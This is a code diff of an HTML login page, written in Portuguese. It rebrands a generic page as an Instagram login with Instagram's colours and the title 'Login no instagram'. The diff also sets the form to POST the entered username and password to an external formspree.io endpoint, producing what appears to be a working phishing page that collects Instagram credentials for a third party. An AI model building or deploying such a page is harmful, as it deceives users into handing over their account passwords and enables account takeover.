@@ -1,106 +1,123 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login</title>
+
+<title>Login no instagram</title>
 
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family: Arial, sans-serif;
-}
-
 body{
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    background: linear-gradient(
-        45deg,
+    margin:0;
+    font-family:Arial, sans-serif;
+    background:linear-gradient(
+        135deg,
         #405DE6,
         #5851DB,
         #833AB4,
         #C13584,
         #E1306C,
         #FD1D1D,
+        #F77737,
+        #FCAF45
+    );
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding:20px;
+    box-sizing:border-box;
+}
+
+/* Caixa principal */
+.container{
+    background:white;
+    width:100%;
+    max-width:420px;
+    padding:25px;
+    border-radius:20px;
+    box-shadow:0 0 20px rgba(0,0,0,0.2);
+}
+
+/* Título */
+h1{
+    text-align:center;
+    color:#C13584;
+    font-size:22px;
+}
+
+/* Inputs */
+input, textarea{
+    width:100%;
+    padding:12px;
+    margin-top:10px;
+    border:1px solid #ddd;
+    border-radius:10px;
+    font-size:16px;
+    box-sizing:border-box;
+}
+
+/* Textarea */
+textarea{
+    height:130px;
+    resize:none;
+}
+
+/* Botão */
+button{
+    width:100%;
+    padding:12px;
+    margin-top:15px;
+    border:none;
+    border-radius:10px;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+    background:linear-gradient(
+        90deg,
+        #833AB4,
+        #C13584,
+        #FD1D1D,
         #FCAF45
     );
 }
 
-.container{
-    background:white;
-    width:90%;
-    max-width:400px;
-    padding:30px;
-    border-radius:15px;
-    box-shadow:0 0 20px rgba(0,0,0,0.2);
-    text-align:center;
-}
-
-h1{
-    margin-bottom:25px;
-    color:#C13584;
-}
-
-input{
-    width:100%;
-    padding:12px;
-    margin:8px 0;
-    border:1px solid #ccc;
-    border-radius:8px;
-}
-
-button{
-    width:100%;
-    padding:12px;
-    border:none;
-    border-radius:8px;
-    background:#C13584;
-    color:white;
-    font-size:16px;
-    cursor:pointer;
-    margin-top:10px;
-}
-
+/* Efeito hover no PC */
 button:hover{
-    background:#a82e72;
+    opacity:0.9;
 }
 
-p{
-    margin-top:15px;
-}
-
-a{
-    text-decoration:none;
-    color:#405DE6;
-}
-
-@media (max-width: 500px){
+/* 🔥 Ajustes para telas grandes (PC) */
+@media (min-width: 768px){
     .container{
-        width:95%;
-        padding:20px;
+        max-width:500px;
+        padding:35px;
+    }
+
+    h1{
+        font-size:26px;
     }
 }
 </style>
 
 </head>
+
 <body>
 
 <div class="container">
-    <h1>Login</h1>
 
-    <form>
-        <input type="text" placeholder="Usuário" required>
+<h1>LOGIN</h1>
 
-        <input type="password" placeholder="Senha" required>
+<form action=https://formspree.io/f/meewdwnd method="POST">
 
-        <button type="submit">Entrar</button>
-    </form>
+<input type="text" name="Usuárii" placeholder="Usuário" required>
 
-    <p>Não tem conta? <a href="#">Cadastre-se</a></p>
+<input name="senha" placeholder=senha required>
+
+<button type="submit">ENTRAR</button>
+
+</form>
+
 </div>
 
 </body>
